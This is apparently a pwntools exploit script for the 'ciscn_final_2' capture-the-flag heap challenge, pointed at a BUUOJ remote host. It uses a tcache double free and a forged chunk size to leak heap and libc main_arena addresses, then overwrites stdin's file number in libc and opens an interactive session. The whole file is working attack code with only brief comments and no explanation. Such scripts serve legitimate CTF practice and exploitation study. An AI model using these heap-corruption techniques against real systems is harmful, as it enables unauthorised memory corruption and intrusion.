from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_final_2')
p = remote('node4.buuoj.cn', 26600)
elf = ELF('ciscn_final_2')
#libc = ELF('libc-2.27.so')
libc = ELF('libc-2.27.buu.so')

def alloc(type, num):
    p.sendlineafter(b'which command?\n> ', b'1')
    p.sendlineafter(b'int\n>', str(type).encode())
    p.sendlineafter(b'number:', str(num).encode())

def delete(type):
    p.sendlineafter(b'which command?\n> ', b'2')
    p.sendlineafter(b'int\n>', str(type).encode())

def show(type):
    p.sendlineafter(b'which command?\n> ', b'3')
    p.sendlineafter(b'int\n>', str(type).encode())

alloc(1, 0x30)
delete(1)
#alloc enough memory for unsorted bin
for i in range(4):
    alloc(2, 0x20)

#double free
delete(2)
#overwrite this chunk size to 0x91, named chunk1
alloc(1, 0)
delete(2)
#now, tcache 0x20: chunkn -> chunkn -> chunkn ->.....
#try leak heap addr of chunk n
show(2)

p.recvuntil(b' :')
heap = int(p.recvuntil(b'\n')[:-1])
if heap < 0:
    heap += 0x10000

alloc(2, heap - 0xa0)
alloc(2, 0)
#move chunk1 to tcache
delete(1)
#override size of chunk1
alloc(2, 0x91)
for i in range(7):
    delete(1)
    alloc(2, 0x20)

delete(1)
show(1)

p.recvuntil(b' :')
main_arena_96 = int(p.recvuntil(b'\n')[:-1])
if main_arena_96 < 0:
    main_arena_96 += 0x100000000

malloc_hook = main_arena_96 - 0x60 - 0x10

#overwrite fno of stdin to 666 by double free
stdin_addr = malloc_hook - libc.sym['__malloc_hook'] + libc.sym['_IO_2_1_stdin_']
stdin_fno_addr = stdin_addr + 0x70

alloc(2, stdin_fno_addr)
alloc(1, 0)
alloc(1, 666)

p.sendlineafter(b'which command?\n> ', b'4')

p.interactive()